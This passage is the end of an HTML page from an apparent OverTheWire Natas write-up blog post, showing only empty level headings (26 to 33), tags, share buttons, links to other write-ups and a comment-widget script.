<h2 id="level-26---level-27"><strong>Level 26 -&gt; Level 27</strong></h2>
<h2 id="level-27---level-28"><strong>Level 27 -&gt; Level 28</strong></h2>
<h2 id="level-28---level-29"><strong>Level 28 -&gt; Level 29</strong></h2>
<h2 id="level-29---level-30"><strong>Level 29 -&gt; Level 30</strong></h2>
<h2 id="level-30---level-31"><strong>Level 30 -&gt; Level 31</strong></h2>
<h2 id="level-31---level-32"><strong>Level 31 -&gt; Level 32</strong></h2>
<h2 id="level-32---level-33"><strong>Level 32 -&gt; Level 33</strong></h2>

      </div>
    </article>

    <hr />

    <div class="post-info">
      
    <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>

        <span class="tag"><a href="/tags/overthewire/">overthewire</a></span>
        <span class="tag"><a href="/tags/ctf/">ctf</a></span>
        <span class="tag"><a href="/tags/german/">german</a></span>
        
    </p>

      

      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
          <polyline points="14 2 14 8 20 8"></polyline>
          <line x1="16" y1="13" x2="8" y2="13"></line>
          <line x1="16" y1="17" x2="8" y2="17"></line>
          <polyline points="10 9 9 9 8 9"></polyline>
        </svg>
        2519 Words
      </p>

      <p>
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
          <line x1="16" y1="2" x2="16" y2="6"></line>
          <line x1="8" y1="2" x2="8" y2="6"></line>
          <line x1="3" y1="10" x2="21" y2="10"></line>
        </svg>
        
          2018-02-13 21:27
        

         
          
        
      </p>
    </div>
      <hr />
      <div class="sharing-buttons">
        
<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=%2fposts%2f2018%2f02%2foverthewire-natas-writeup-level-0-bis-14%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=%2fposts%2f2018%2f02%2foverthewire-natas-writeup-level-0-bis-14%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=OverTheWire%20Natas%20WriteUp%20-%20Level%200%20bis%2014&amp;caption=OverTheWire%20Natas%20WriteUp%20-%20Level%200%20bis%2014&amp;canonicalUrl=%2fposts%2f2018%2f02%2foverthewire-natas-writeup-level-0-bis-14%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="mailto:?subject=OverTheWire%20Natas%20WriteUp%20-%20Level%200%20bis%2014&amp;body=%2fposts%2f2018%2f02%2foverthewire-natas-writeup-level-0-bis-14%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=%2fposts%2f2018%2f02%2foverthewire-natas-writeup-level-0-bis-14%2f&amp;media=%2fposts%2f2018%2f02%2foverthewire-natas-writeup-level-0-bis-14%2f;description=OverTheWire%20Natas%20WriteUp%20-%20Level%200%20bis%2014" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=%2fposts%2f2018%2f02%2foverthewire-natas-writeup-level-0-bis-14%2f&amp;title=OverTheWire%20Natas%20WriteUp%20-%20Level%200%20bis%2014&amp;summary=OverTheWire%20Natas%20WriteUp%20-%20Level%200%20bis%2014&amp;source=%2fposts%2f2018%2f02%2foverthewire-natas-writeup-level-0-bis-14%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=%2fposts%2f2018%2f02%2foverthewire-natas-writeup-level-0-bis-14%2f&amp;resubmit=true&amp;title=OverTheWire%20Natas%20WriteUp%20-%20Level%200%20bis%2014" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=%2fposts%2f2018%2f02%2foverthewire-natas-writeup-level-0-bis-14%2f;title=OverTheWire%20Natas%20WriteUp%20-%20Level%200%20bis%2014" target="_blank" rel="noopener" aria-label="" title="Share on xing">
  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="whatsapp://send?text=OverTheWire%20Natas%20WriteUp%20-%20Level%200%20bis%2014%20%2fposts%2f2018%2f02%2foverthewire-natas-writeup-level-0-bis-14%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=%2fposts%2f2018%2f02%2foverthewire-natas-writeup-level-0-bis-14%2f&amp;t=OverTheWire%20Natas%20WriteUp%20-%20Level%200%20bis%2014" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=OverTheWire%20Natas%20WriteUp%20-%20Level%200%20bis%2014&amp;url=%2fposts%2f2018%2f02%2foverthewire-natas-writeup-level-0-bis-14%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
    </div>
  </div>
</a>

      </div>

    
    <div class="pagination">
        <div class="pagination__title">
            <span class="pagination__title-h"></span>
            <hr />
        </div>

        <div class="pagination__buttons">
            
            <span class="button previous">
                <a href="/posts/2018/02/hackthebox-shocker-writeup-tipps-anleitung/">
                    <span class="button__icon">←</span>
                    <span class="button__text">HackTheBox - Shocker WriteUp | Tipps &#43; Anleitung</span>
                </a>
            </span>
            

            
            <span class="button next">
                <a href="/posts/2018/02/overthewire-bandit-writeup-alle-level/">
                    <span class="button__text">OverTheWire Bandit WriteUp - Alle Level</span>
                    <span class="button__icon">→</span>
                </a>
            </span>
            
        </div>
    </div>


    
      
        <div id="comments">
          <div id="disqus_thread"></div>
<script type="application/javascript">
    var disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "m10x" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
        </div>
      
    

    

  </main>

            </div>

            
                <footer class="footer">
    
    
</footer>

            
        </div>

        



<script type="text/javascript" src="/bundle.min.599099f1f14b78b657d524b28e10e0c5098e7cd46e9c7aed73d577068a276c3ff1bb234cbf29cb313333e83cf411727b43157c91ce5b809e2ffc81664614608e.js" integrity="sha512-WZCZ8fFLeLZX1SSyjhDgxQmOfNRunHrtc9V3BoonbD/xuyNMvynLMTMz6Dz0EXJ7QxV8kc5bgJ4v/IFmRhRgjg=="></script>



    </body>
</html>
